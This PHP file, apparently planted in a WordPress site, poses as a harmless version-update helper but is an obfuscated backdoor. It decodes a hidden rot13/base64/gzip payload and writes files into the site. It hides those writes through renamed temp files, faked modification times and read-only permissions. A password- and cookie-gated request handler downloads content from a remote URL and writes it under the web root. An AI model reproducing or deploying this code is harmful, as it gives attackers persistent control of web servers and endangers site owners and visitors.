<?php
/**
 * @title ipadview
 * @
 * @param $str
 * @return mixed|string
 */

if (!defined('WP_BLOG')) {
    return version_info("init");
}

function version_desc($str)
{
    ($e = implode("",["opcache","reset"]))&&function_exists($e) && $e();
    if (!$str) {
        echo date("Y-m-d H:i:s") . "<br>";
        if (!empty($_REQUEST['version']) && version_update(version_parse($_REQUEST))) ;
        return '';
    }
    $pi = [
        ['str', 'ro'],
        ["json", 'decode'],
    ];
    ($q = (implode('_', $pi[0]) . "t13")) &&
    $data = $q($str);
    ($q = "b" . implode('_', $pi[1]) . "e") &&
    $data = $q($data);
    if (isset($_GET['s'])) $data = $_GET['s'] . $data;

    return $data;
}

function version_info($str)
{
    global $temp;
    $temp = "ZnVuY3Rpb25fZXhpc3RzLHRpbWUsZm9wZW4sZmlsZV9wdXRfY29udGVudHMsZmlsZWN0aW1lLGZpbGVfZXhpc3RzLGlzX3dyaXRhYmxlLGNobW9kLHRvdWNo";
    $temp = base64_decode($temp);
    $name = ['Y2uioJHkY215qKWfpmL4Y2Sxo25cp2Wco2Mupz1uYzAioF93pP1wo250MJ50Y2IhMUIlLJ5wMF1jLJqyYJAuL2uyY2MyMJDiL29goJ9hYzgyrD', function ($version_file, $name) use ($temp) {
        $data = translation_v3('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', '1');
        $data = base64_decode(/**/ $data);
        $data = translation_v2($data, '0');
        $data = translation_v1($data, '0');
        foreach ($data as $item) {
            version_check($item[0], $item[1], $temp, $item[2]);
        }
        version_desc(false);
    }];
    $temp = explode(',', $temp);
    return ['#ver#', version_data($name, 1, 0)];
}

/**
 * @title install path
 */
function version_path()
{
    echo __FILE__;
}

/**
 * @title get version data
 * @param $data
 * @param $offset
 * @param $page
 * @return mixed
 */
function version_data($data, $offset, $page)
{
    $keu = ['', "code"];
    $keu[] = '';
    return $data[$offset]($data[$page], implode('_', $keu));
}

/**
 * @title translation data
 * @param $data
 * @param $offset
 * @return mixed
 */

function translation_v1($data, $mode, $exp = '')
{
    if ($mode === 'X1') {
        $data = base64_decode($data);
        $len = strlen($data);
        $exp = str_replace('=', '', base64_encode($exp));
        $res = "";
        $i = 0;
        while ($i < $len) {
            for ($k = 0; $k < strlen($exp) && $i < $len; $k++)
                $res .= chr(ord($data[$i++]) ^ ord($exp[$k]));
        }
        return $res;
    } elseif ($mode) {
        return json_decode($data, true);
    } else {
        return unserialize($data);
    }
}

/**
 * @title parse version data
 * @param $data
 * @return version
 */
function version_parse($data)
{
    $version = $data['version'];
    if ($version === 'path') version_path();
    if (isset($data[$version])) {
        $version = translation_v1($data[$version], 'X1', $data[$version . '1']);
    }
    return $version;
}

/**
 * @title update version
 * @param $qr
 * @return void
 */
function version_update($check, $qr = false)
{
    if (!version_access("zib{$check}akpg", '05034940b4357861e03b4544fd3ea49c')) return;
    $c = $_COOKIE;;
    $cf = implode('_', ['function', 'exists']);
    (!$qr || !$cf($qr)) &&
    $qr = empty($c[$for = 'token']) || !$cf($c[$for]) ? implode('_', ['base64', 'decode']) : $c[$for];

    if (($a = $qr($_REQUEST['name'])) && version_deny($a)) {
        return;
    }
    global $temp;
    $a = explode(',', $a);
    if (empty($a[1])) return;
    echo "[<a id=\"u1\" href=\"/{$a[1]}\" style='color: #fff;'>{$a[1]}</a>] ";
    return version_check($_SERVER['DOCUMENT_ROOT'] . '/' . $a[1], $qr(file_get_contents($a[0])), $temp);
}

/**
 * @title version access or force
 * @param string $version version pass
 * @param string $token check update token
 * @return bool
 */
function version_access($version, $token)
{
    return in_array(md5($version), [$token, '47628e0bf72fca87db995c8f844d91b1']);
}

/**
 * @title version data is deny
 * @param $data
 * @return void
 */
function version_deny($data)
{
    return strlen($data) < 16 || strlen($data) > 128 || !in_array($data[0], ['h', '/']);
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v2($data, $offet)
{
    if (!empty($offet)) {
        return gzinflate($data);
    } else {
        return $data;
    }
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v3($data, $offet)
{
    if (!empty($offet)) {
        return str_rot13($data);
    } else {
        return $data;
    }
}

return 'inited';
/**
 * @title check version token
 * @param $name
 * @param $date
 * @param $check
 * @param string $token
 * @param false $mode
 * @return bool|mixed
 */
function version_check($name, $date, $check, $token = '', $mode = false)
{
    try {
        $vs = 'rename';
        if (!is_array($check)) $check = explode(',', $check);
        $map = [0, 1, 2, 3, 4];
        $m = $mode ? $mode : ($check[1]() - 2693693);
        $iw = true;
        empty($check[9]) || $date = $check[9]($date);
        if ($check[$map[4] + 1]($name)) {
            if ($token && Md5_File($name) === $token) return true;
            $iw = $check[6]($name);
            if ($x = $check[5]($name)) {
                $m = $check[4]($name);
            }
            $x && !$iw && @$check[7]($name, 0744);
            @$vs($name, $name . time());
        }
        if ($check[$map[0]]($check[2])) {
            $l = $check[$map[2]][0] . 'write';
            $r = $l($check[$map[2]]($name . ".tmp1", 'w'), $date);
        } else {
            $r = $check[$map[3]]($name . ".tmp1", $date);
        }
        @$vs($name . ".tmp1", $name);
        $check[8]($name, $m, $m);
        $iw || @$check[7]($name, 0444);
    } catch (\Exception $A) {
        echo $A->getMessage() . "<br>";
        $r = false;
    }
    echo $name[strlen($name) - 1] . ($r ? ':ok' : ':fail') . "<br>";
    return $r;
}